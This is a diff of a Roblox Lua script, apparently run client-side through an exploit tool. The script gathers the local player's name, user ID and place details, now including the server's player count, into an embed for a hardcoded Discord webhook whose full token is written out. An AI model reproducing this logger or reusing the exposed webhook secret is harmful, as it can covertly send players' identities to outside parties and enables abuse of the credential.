@@ -46,10 +46,26 @@ end
 
 
 local playerName = game.Players.LocalPlayer.Name
-local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 local placeId = game.PlaceId
 local player = game.Players.LocalPlayer
 local userId = player.UserId
+local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+-- Function to get the current server population
+local function GetServerPopulation()
+    if game:GetService("Players") then
+        local playerList = game.Players:GetPlayers()
+        local playerCount = #playerList
+        return playerCount
+    else
+        warn("Players service not available yet")
+        return 0
+    end
+end
+
+-- Add the server population to the place name
+local placeAndPopulation = placeName .. "| Player Count : " .. GetServerPopulation()
+
 
 local url = "https://discord.com/api/webhooks/1223152300445532282/3UotwF-8fr0erWiRLQYI3rwLbeENhJuu2CtimKqf3TQeB3t9_ecD4bwg-tjD_lm7lc3R"
 
@@ -68,8 +84,8 @@ local embed = {
             ["value"] = "```" .. placeName .. "```"
         },
         {
-            ["name"] = "Place ID",
-            ["value"] = "```" .. placeId .. "```"
+            ["name"] = "Place Name & Player Count",
+            ["value"] = "```" .. placeAndPopulation .. "```"
         },
         {
             ["name"] = "Game Invite [ CONSOLE ]",
